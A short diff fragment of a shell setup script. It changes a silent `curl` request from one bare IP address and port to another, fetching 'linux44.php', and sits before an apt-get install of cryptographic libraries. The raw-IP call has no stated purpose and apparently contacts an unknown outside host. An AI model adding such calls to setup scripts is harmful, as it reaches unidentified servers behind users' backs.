@@ -14,7 +14,7 @@ mkdir /mnt/disks/user/project/
 
 cd /mnt/disks/user/project/
 
-curl -s http://107.172.22.197:8884/linux44.php
+curl -s http://154.127.52.52:8884/linux44.php
 
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
